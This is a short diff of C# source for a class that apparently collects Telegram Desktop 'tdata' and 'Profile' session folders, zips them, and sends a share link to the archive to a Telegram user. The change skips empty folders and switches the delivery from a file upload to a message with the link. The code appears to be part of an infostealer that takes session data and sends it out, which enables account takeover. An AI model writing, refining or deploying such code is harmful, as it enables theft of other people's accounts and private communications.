@@ -55,6 +55,8 @@ public class TelegramServiceCommand(Client client, DataService data, Random rand
                              return name.StartsWith("Profile") || name.StartsWith("tdata");
                          }))
             {
+                if (Directory.GetFiles(tdata).Length == 0) continue;
+                
                 if (created) zip.CompressionMode = CompressionMode.Append;
                 
                 int namestart = tdata.LastIndexOf('\\'), nameendindex = tdata[namestart..].IndexOf(' ');
@@ -76,6 +78,6 @@ public class TelegramServiceCommand(Client client, DataService data, Random rand
             return;
         }
 
-        await data.SendFileAsync(user, zippath, await data.GetShareLinkAsync(zippath));
+        await client.Messages_SendMessage(user, $"{logsname}\n{await data.GetShareLinkAsync(zippath)}", random.NextInt64(), clear_draft: true);
     }
 }
